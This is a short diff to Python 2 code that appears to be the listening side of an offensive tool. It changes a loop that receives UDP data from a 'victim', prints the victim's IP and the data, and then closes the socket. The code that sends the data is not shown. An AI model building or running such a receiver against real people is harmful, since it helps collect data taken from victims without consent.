@@ -11,9 +11,11 @@ def add_new_victim():
 
 def main():
     while True:
-        victim, data = Messenger.listen(PORT)
-        print "Victim IP is %s" % (victim)
+        s = Messenger.set_up_listening_socket(LISTEN_PORT)
+        data, victim = s.recvfrom(8192)
+        print "Victim IP is %s" % (str(victim))
         print data
+        s.close()
 
 
 if __name__ == '__main__':
